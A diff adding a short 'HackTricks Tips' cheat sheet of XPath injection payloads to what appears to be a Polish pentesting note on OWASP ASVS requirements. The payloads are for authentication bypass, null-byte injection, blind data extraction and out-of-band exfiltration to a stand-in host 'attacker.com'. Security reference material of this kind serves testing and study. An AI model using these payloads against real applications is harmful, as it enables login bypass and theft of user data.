@@ -108,3 +108,15 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.2.7 | Injection Prevention | Verify that the application is protected against XPath injection attacks by using query parameterization or precompiled queries. |
+
+
+---
+
+## HackTricks Tips
+
+- **Auth bypass**: `' or '1'='1` (oba pola) lub `' or true() or '`
+- **Null injection**: `' or 1]%00`
+- **Schema discovery**: `and count(/*[1]/*) = 2` → mapuj drzewo liczeniem child nodes
+- **Blind extraction**: `substring(//user[1]/child::node()[1],1,1)="a"`
+- **OOB exfil**: `doc(concat("http://attacker.com/",encode-for-uri(/Employees/Employee[1]/username)))`
+- **Tool**: `xcat` — automatyczna blind XPath eksploatacja
